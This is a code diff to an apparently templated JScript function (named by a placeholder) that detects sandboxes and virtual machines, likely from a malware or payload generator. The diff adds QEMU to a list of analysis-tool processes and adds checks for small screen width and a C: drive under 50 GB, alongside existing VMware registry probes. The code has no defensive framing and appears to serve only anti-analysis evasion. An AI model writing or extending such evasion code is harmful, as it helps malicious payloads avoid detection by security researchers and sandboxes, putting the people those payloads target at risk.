@@ -32,14 +32,23 @@
     function {{ v.fn_sandbox }}() {
         try {
             var wmi  = GetObject("winmgmts:");
-            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe"];
+            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe"];
             var pq   = wmi.ExecQuery("SELECT Name FROM Win32_Process");
             for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
                 var n = e.item().Name.toLowerCase();
                 for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
             }
+            var mq = wmi.ExecQuery("SELECT ScreenWidth,ScreenHeight FROM Win32_DesktopMonitor");
+            for (var em = new Enumerator(mq); !em.atEnd(); em.moveNext()) {
+                var d = em.item();
+                if (d.ScreenWidth && d.ScreenWidth < 800) return true;
+            }
         } catch(e) {}
-        // VM registry checks
+        try {
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var drv = fso.GetDrive("C:");
+            if (drv.TotalSize < 53687091200) return true;
+        } catch(e) {}
         try {
             var sh = new ActiveXObject("WScript.Shell");
             sh.RegRead("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath");
